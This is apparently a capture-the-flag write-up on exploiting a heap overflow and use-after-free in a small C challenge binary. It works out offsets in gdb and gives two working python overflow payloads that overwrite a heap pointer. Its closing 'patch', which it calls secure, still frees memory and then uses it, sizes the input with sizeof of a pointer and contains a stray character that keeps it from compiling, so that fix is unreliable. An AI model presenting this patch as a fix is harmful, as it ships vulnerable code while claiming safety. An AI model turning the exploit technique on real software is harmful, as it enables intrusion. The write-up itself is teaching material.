Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

struct nova
{
   char pulsar[50];
   int  cluster;
   int *ion;
};

int main()
{
   int solar_wind;

   int ran;
   ran = fopen("/dev/urandom", "rb");
   char rbuf[50];
   fread(rbuf, sizeof(rbuf), 1, ran);
   srand(rbuf);

   struct nova *centari, *castor, *vega;
   
   centari = malloc(sizeof(struct nova));
   centari->ion = malloc(9);
   centari->cluster = 0;

   castor = malloc(sizeof(struct nova));
   castor->ion = malloc(9);
   castor->cluster = 0;
      

   vega = malloc(sizeof(struct nova));
   vega->ion = malloc(9);
   vega->cluster = 0;

   centari->cluster = rand() % 100;
   solar_wind = centari->cluster;
   free(centari);
   free(centari->ion);
   centari->ion = NULL;
   centari = NULL;   

   fgets(castor->ion, 100, stdin);
   
   puts("Where do you want to point the James Webb Space Telescope?");
   if (*vega->ion == solar_wind)
   {
      puts("Wow while managine to not do your research, you discovered life on another planet. I am genuinely surprised. Level Cleared!");
   }
   else
   {
      printf("You see %p.\n", vega->ion);
   }
}
```

So we see that in order to pwn this challenge, we have to set the memory pointed to by vega->ion equal to the value of the int solar_wind. We see that solar_wind is set eqaul to the value of by centari->cluster, which is equal to a random number between 0 and 99. We see that after solar_wind is set equal to centari->cluster, the memory is freed and the pointer is set equal to null thus preventing us from using centari or centari->ion as a stale pointer. 

Just scanning through the program, we see a heap overflow vulnearbillity in which it will allow us to write 100 characters to the space at castor->ion which can only hold 9 characters worth of data. Let's map out the heap space allocated via malloc calls.

```
gguyinatuxedo@tux:/Hackery/escape/heap_exp/h4$ ltrace ./h4
__libc_start_main(0x80485cb, 1, 0xffffd104, 0x8048780 <unfinished ...>
fopen("/dev/urandom", "rb")                      = 0x804b008
fread(0xffffd00a, 50, 1, 0x804b008)              = 1
srand(0xffffd00a, 50, 1, 0x804b008)              = 0
malloc(60)                                       = 0x804c170
malloc(9)                                        = 0x804c1b0
malloc(60)                                       = 0x804c1c0
malloc(9)                                        = 0x804c200
malloc(60)                                       = 0x804c210
malloc(9)                                        = 0x804c250
rand(0, 0xffffd0a4, 0x24dc4000, 0xc51c6443)      = 0x24f9ca13
free(0x804c170)                                  = <void>
free(0x804c1b0)                                  = <void>
fgets(Space is really really vast
"Space is really really vast\n", 100, 0xf7fb45a0) = 0x804c200
puts("Where do you want to point the J"...Where do you want to point the James Webb Space Telescope?
)      = 59
printf("You see %p.\n", 0x804c250You see 0x804c250.
)               = 19
+++ exited (status 0) +++
```

So now we have all of the addresses allocated in the heap.

```
malloc(60)                                       = 0x804c170
malloc(9)                                        = 0x804c1b0
malloc(60)                                       = 0x804c1c0
malloc(9)                                        = 0x804c200
malloc(60)                                       = 0x804c210
malloc(9)                                        = 0x804c250
```

The first thing we notice is that the size of the mallocs of centari, castor, and vega are 60. The program allocates 50 bytes for the pulsar char, and 4 bytes each for the cluster int and ion pointers That should make 58 bytes, not 60. However gcc added two bytes worth of padding to the end of pulsar, that way the two pointers after it could be stored in their own word, or 4 bytes segment (because 50 % 4 = 2, however 52 % 4 = 0). Just for demonstration I modified the code to fill in the buffer with 50 characters with the following line of code.

```
   strcpy(centari->pulsar, "00000000000000000000000000000000000000000000000000");
``` 

After the strcpy executed, here was what centari held.

```
gdb-peda$ x/15w 0x804c170
0x804c170:  0x30303030  0x30303030  0x30303030  0x30303030
0x804c180:  0x30303030  0x30303030  0x30303030  0x30303030
0x804c190:  0x30303030  0x30303030  0x30303030  0x30303030
0x804c1a0:  0x00003030  0x0000002b  0x0804c1b0
```

So looking for the exploit, we won't be able to touch centari, centari->cluster, or centari->ion. This is because our overflow works towards higher addresses, and our overflow starts at 0x804c200 which is higher than any of the those addresses (We know which address stores what, because the same order that the malloc calls happen is the same order that the address appear. Look to h1 and h2 for a better explanation). However this means that the addresses 0x804c210 (vega) and 0x804c250 (vega->ion) are within our reach. So we control the pointer which is being dereferenced and evaluated. However at this point we have two options. The first involves this. 

```
   free(centari);
   free(centari->ion);
   centari->ion = NULL;
   centari = NULL; 
```

Looking here, it frees the memory and overwrites the pointers with null to prevent stale pointers. However when it frees memory, it doesn't rewrite the memory. It only designates that the memory is able to be used for other purposes. So the data is still there. If we can find the exact address that it is stored at, we can overflow vega->ion to have that address. That way when it is dereferenced and compared against solar_wind, it will have the same value.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080485cb <+0>:  lea    ecx,[esp+0x4]
   0x080485cf <+4>:  and    esp,0xfffffff0
   0x080485d2 <+7>:  push   DWORD PTR [ecx-0x4]
   0x080485d5 <+10>: push   ebp
   0x080485d6 <+11>: mov    ebp,esp
   0x080485d8 <+13>: push   ecx
   0x080485d9 <+14>: sub    esp,0x54
   0x080485dc <+17>: sub    esp,0x8
   0x080485df <+20>: push   0x8048800
   0x080485e4 <+25>: push   0x8048803
   0x080485e9 <+30>: call   0x80484a0 <fopen@plt>
   0x080485ee <+35>: add    esp,0x10
   0x080485f1 <+38>: mov    DWORD PTR [ebp-0xc],eax
   0x080485f4 <+41>: mov    eax,DWORD PTR [ebp-0xc]
   0x080485f7 <+44>: push   eax
   0x080485f8 <+45>: push   0x1
   0x080485fa <+47>: push   0x32
   0x080485fc <+49>: lea    eax,[ebp-0x4e]
   0x080485ff <+52>: push   eax
   0x08048600 <+53>: call   0x8048450 <fread@plt>
   0x08048605 <+58>: add    esp,0x10
   0x08048608 <+61>: lea    eax,[ebp-0x4e]
   0x0804860b <+64>: sub    esp,0xc
   0x0804860e <+67>: push   eax
   0x0804860f <+68>: call   0x8048480 <srand@plt>
   0x08048614 <+73>: add    esp,0x10
   0x08048617 <+76>: sub    esp,0xc
   0x0804861a <+79>: push   0x3c
   0x0804861c <+81>: call   0x8048460 <malloc@plt>
   0x08048621 <+86>: add    esp,0x10
   0x08048624 <+89>: mov    DWORD PTR [ebp-0x10],eax
   0x08048627 <+92>: sub    esp,0xc
   0x0804862a <+95>: push   0x9
   0x0804862c <+97>: call   0x8048460 <malloc@plt>
   0x08048631 <+102>:   add    esp,0x10
   0x08048634 <+105>:   mov    edx,eax
   0x08048636 <+107>:   mov    eax,DWORD PTR [ebp-0x10]
   0x08048639 <+110>:   mov    DWORD PTR [eax+0x38],edx
   0x0804863c <+113>:   mov    eax,DWORD PTR [ebp-0x10]
   0x0804863f <+116>:   mov    DWORD PTR [eax+0x34],0x0
   0x08048646 <+123>:   sub    esp,0xc
   0x08048649 <+126>:   push   0x3c
   0x0804864b <+128>:   call   0x8048460 <malloc@plt>
   0x08048650 <+133>:   add    esp,0x10
   0x08048653 <+136>:   mov    DWORD PTR [ebp-0x14],eax
   0x08048656 <+139>:   sub    esp,0xc
   0x08048659 <+142>:   push   0x9
   0x0804865b <+144>:   call   0x8048460 <malloc@plt>
   0x08048660 <+149>:   add    esp,0x10
   0x08048663 <+152>:   mov    edx,eax
   0x08048665 <+154>:   mov    eax,DWORD PTR [ebp-0x14]
   0x08048668 <+157>:   mov    DWORD PTR [eax+0x38],edx
   0x0804866b <+160>:   mov    eax,DWORD PTR [ebp-0x14]
   0x0804866e <+163>:   mov    DWORD PTR [eax+0x34],0x0
   0x08048675 <+170>:   sub    esp,0xc
   0x08048678 <+173>:   push   0x3c
   0x0804867a <+175>:   call   0x8048460 <malloc@plt>
   0x0804867f <+180>:   add    esp,0x10
   0x08048682 <+183>:   mov    DWORD PTR [ebp-0x18],eax
   0x08048685 <+186>:   sub    esp,0xc
   0x08048688 <+189>:   push   0x9
   0x0804868a <+191>:   call   0x8048460 <malloc@plt>
   0x0804868f <+196>:   add    esp,0x10
   0x08048692 <+199>:   mov    edx,eax
   0x08048694 <+201>:   mov    eax,DWORD PTR [ebp-0x18]
   0x08048697 <+204>:   mov    DWORD PTR [eax+0x38],edx
   0x0804869a <+207>:   mov    eax,DWORD PTR [ebp-0x18]
   0x0804869d <+210>:   mov    DWORD PTR [eax+0x34],0x0
   0x080486a4 <+217>:   call   0x80484b0 <rand@plt>
   0x080486a9 <+222>:   mov    ecx,eax
   0x080486ab <+224>:   mov    edx,0x51eb851f
   0x080486b0 <+229>:   mov    eax,ecx
   0x080486b2 <+231>:   imul   edx
   0x080486b4 <+233>:   sar    edx,0x5
   0x080486b7 <+236>:   mov    eax,ecx
   0x080486b9 <+238>:   sar    eax,0x1f
   0x080486bc <+241>:   sub    edx,eax
   0x080486be <+243>:   mov    eax,edx
   0x080486c0 <+245>:   imul   eax,eax,0x64
   0x080486c3 <+248>:   sub    ecx,eax
   0x080486c5 <+250>:   mov    eax,ecx
   0x080486c7 <+252>:   mov    edx,DWORD PTR [ebp-0x10]
   0x080486ca <+255>:   mov    DWORD PTR [edx+0x34],eax
   0x080486cd <+258>:   mov    eax,DWORD PTR [ebp-0x10]
   0x080486d0 <+261>:   mov    eax,DWORD PTR [eax+0x34]
   0x080486d3 <+264>:   mov    DWORD PTR [ebp-0x1c],eax
   0x080486d6 <+267>:   sub    esp,0xc
   0x080486d9 <+270>:   push   DWORD PTR [ebp-0x10]
   0x080486dc <+273>:   call   0x8048430 <free@plt>
   0x080486e1 <+278>:   add    esp,0x10
   0x080486e4 <+281>:   mov    eax,DWORD PTR [ebp-0x10]
   0x080486e7 <+284>:   mov    eax,DWORD PTR [eax+0x38]
   0x080486ea <+287>:   sub    esp,0xc
   0x080486ed <+290>:   push   eax
   0x080486ee <+291>:   call   0x8048430 <free@plt>
   0x080486f3 <+296>:   add    esp,0x10
   0x080486f6 <+299>:   mov    eax,DWORD PTR [ebp-0x10]
   0x080486f9 <+302>:   mov    DWORD PTR [eax+0x38],0x0
   0x08048700 <+309>:   mov    DWORD PTR [ebp-0x10],0x0
   0x08048707 <+316>:   mov    edx,DWORD PTR ds:0x804a040
   0x0804870d <+322>:   mov    eax,DWORD PTR [ebp-0x14]
   0x08048710 <+325>:   mov    eax,DWORD PTR [eax+0x38]
   0x08048713 <+328>:   sub    esp,0x4
   0x08048716 <+331>:   push   edx
   0x08048717 <+332>:   push   0x64
   0x08048719 <+334>:   push   eax
   0x0804871a <+335>:   call   0x8048440 <fgets@plt>
   0x0804871f <+340>:   add    esp,0x10
   0x08048722 <+343>:   sub    esp,0xc
   0x08048725 <+346>:   push   0x8048810
   0x0804872a <+351>:   call   0x8048470 <puts@plt>
   0x0804872f <+356>:   add    esp,0x10
   0x08048732 <+359>:   mov    eax,DWORD PTR [ebp-0x18]
   0x08048735 <+362>:   mov    eax,DWORD PTR [eax+0x38]
   0x08048738 <+365>:   mov    eax,DWORD PTR [eax]
   0x0804873a <+367>:   cmp    eax,DWORD PTR [ebp-0x1c]
   0x0804873d <+370>:   jne    0x8048751 <main+390>
   0x0804873f <+372>:   sub    esp,0xc
   0x08048742 <+375>:   push   0x804884c
   0x08048747 <+380>:   call   0x8048470 <puts@plt>
   0x0804874c <+385>:   add    esp,0x10
   0x0804874f <+388>:   jmp    0x8048768 <main+413>
   0x08048751 <+390>:   mov    eax,DWORD PTR [ebp-0x18]
   0x08048754 <+393>:   mov    eax,DWORD PTR [eax+0x38]
   0x08048757 <+396>:   sub    esp,0x8
   0x0804875a <+399>:   push   eax
   0x0804875b <+400>:   push   0x80488c8
   0x08048760 <+405>:   call   0x8048420 <printf@plt>
   0x08048765 <+410>:   add    esp,0x10
   0x08048768 <+413>:   mov    eax,0x0
   0x0804876d <+418>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x08048770 <+421>:   leave  
   0x08048771 <+422>:   lea    esp,[ecx-0x4]
   0x08048774 <+425>:   ret    
End of assembler dump.
gdb-peda$ b *main+367
Breakpoint 1 at 0x804873a
gdb-peda$ r
Starting program: /Hackery/escape/heap_exp/h4/h4 
75395128
Where do you want to point the James Webb Space Telescope?
```

One wall of text later...

```
Breakpoint 1, 0x0804873a in main ()
gdb-peda$ x/15w 0x804c170
0x804c170:  0xf7fb47f8  0xf7fb47f8  0x00000000  0x00000000
0x804c180:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c190:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c1a0:  0x00000000  0x0000002d  0x00000000
gdb-peda$ x/d 0x804c1a4
0x804c1a4:  45
```

So we have the address that the value is stored at, 0x0804c1a4. Now we need to figure out the offset needed to reach vega->ion. We know that our offset starts at 0x804c200, and it should be 56 bytes after 0x804c210 (because the ion pointer is four bytes, and the last thing declared in the struct). 

```
0x804c210 + 56 = 0x804c248
0x804c248 - 0x804c200 = 72
```

So if our math is correct, the offset needed to reach vega->ion is 72 characters. The program prints out vega->ion as a pointer if we mess up so we can see what happened, so let's try to just give it 72 characters followed by the 0x0804c1a4 address.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h4$ python -c 'print "0"*72 + "\xa4\xc1\x04\x08"' | ./h4
Where do you want to point the James Webb Space Telescope?
Wow while managine to not do your research, you discovered life on another planet. I am genuinely surprised. Level Cleared!
```

Just like that, we pwned the binary using a use after free exploit. However there is another way we could pwn it. There are two places in the program's memory that stores the value we need, and we already pointed to one of them. We could overflow the pointer to point to the int solar_wind itself, that way when the if then statment runs it will be effictively checking if solar_wind is equal to solar_wind. First we will need to find the relative address of sloar_wind on the stack. Let's try looking at the assembly code for the if then statement.

```
   0x08048732 <+359>:   mov    eax,DWORD PTR [ebp-0x18]
   0x08048735 <+362>:   mov    eax,DWORD PTR [eax+0x38]
   0x08048738 <+365>:   mov    eax,DWORD PTR [eax]
   0x0804873a <+367>:   cmp    eax,DWORD PTR [ebp-0x1c]
```

So looking at this assembly, the eax register is being compared against the value at ebp-0x1c. The value being moved into the eax register looks like a drereferenced pointer, so let's set a breakpoint for main+367 and see what ebp-0x1c holds.

```
gdb-peda$ b *main+367
Breakpoint 1 at 0x804873a
gdb-peda$ r
Starting program: /Hackery/escape/heap_exp/h4/h4 
753951
Where do you want to point the James Webb Space Telescope?
```

One wall of text later...

```
Breakpoint 1, 0x0804873a in main ()
gdb-peda$ x/d $ebp-0x1c
0xffffd01c: 45
```

So that decimal there matches what we would expect, so it probably is the value were looking for. It is stored at the address 0xffffd01c in gdb. However since stack addresses change, when we run it outside of gdb we will have a different address however it will be close to it. Let's try pushing addresses close to 0xffffd01c to vega->ion and see if we find the right address.

```
Addresses I tried:
0xffffd01c
0xffffd02c
0xffffd03c
0xffffd04c
```

Then I found the correct address, 0xffffd04c. So the final alternative exploit looks like this.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h4$ python -c 'print "0"*72 + "\x4c\xd0\xff\xff"' | ./h4
Where do you want to point the James Webb Space Telescope?
Wow while managine to not do your research, you discovered life on another planet. I am genuinely surprised. Level Cleared!
```

Just like that we pwned the binary again. Let's patch it!

```
#include <stdlib.h>
#include <stdio.h>

struct nova
{
   char pulsar[50];
   int  cluster;
   int *ion;
};

int main()
{
   int solar_wind;

   int ran;
   ran = fopen("/dev/urandom", "rb");
   char rbuf[50];
   fread(rbuf, sizeof(rbuf), 1, ran);
   srand(rbuf);

   struct nova *centari, *castor, *vega;
   
   centari = malloc(sizeof(struct nova));
   centari->ion = malloc(9);
   centari->cluster = 0;

   castor = malloc(sizeof(struct nova));
   castor->ion = malloc(9);
   castor->cluster = 0;
      

   vega = malloc(sizeof(struct nova));
   vega->ion = malloc(9);
   vega->cluster = 0;

   centari->cluster = rand() % 100;
   solar_wind = centari->cluster;
   free(centari->ion);
   memset(centari->ion, '0', sizeof(centari->ion));_
   memset(centari, '0', sizeof(struct nova));
   free(centari);
   free(centari->ion);
   centari = NULL;   

   fgets(castor->ion, sizeof(castor->ion), stdin);
   
   puts("Where do you want to point the James Webb Space Telescope?");
   if (*vega->ion == solar_wind)
   {
      puts("Wow while managine to not do your research, you discovered life on another planet. I am genuinely surprised. Level Cleared!");
   }
   else
   {
      printf("You see %p.\n", vega->ion);
   }
}
```

So we see that both vulnerabillities have been patched. The heap overflow vulnerabillity has been patched to only allow as much data in as castor->ion can hold. Let's test it.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h4$ python -c 'print "0"*500' | ./h4_secure 
Where do you want to point the James Webb Space Telescope?
You see 0x804c250.
```

So that vulnerabillity is patched. Now for the use after free vulnerabillity, before I freed it I used memset to write over all of the space. That way when it was freed, all it would contain is ascii zeroes, so they wouldn't be able to read the data. The reason why I had to changethe order of how the data is freed and removed centari->ion from being set equal to NULL is that the pointer for centari->ion is stored in centari. So when we wrote over centari we wrote over the pointer. Anything that used centari->ion after thhat would cause the program to crash. Let's open it up in gdb and see if the patch worked.

```
gdb-peda$ b *main+336
Breakpoint 1 at 0x804871b
gdb-peda$ r
Starting program: /Hackery/escape/heap_exp/h4/h4_secure 
75395128
Where do you want to point the James Webb Space Telescope?
```

One wall of text later...

```
Breakpoint 1, 0x0804871b in main ()
gdb-peda$ x/15w 0x804c170
0x804c170:  0x30303030  0x30303030  0x30303030  0x30303030
0x804c180:  0x30303030  0x30303030  0x30303030  0x30303030
0x804c190:  0x30303030  0x30303030  0x30303030  0x30303030
0x804c1a0:  0x30303030  0x30303030  0x30303030
```

As you can see, all of the data has been written over. Just like that we patched the binary!






python -c 'print "0"*72 + "\xa4\xc1\x04\x08"' | ./h4
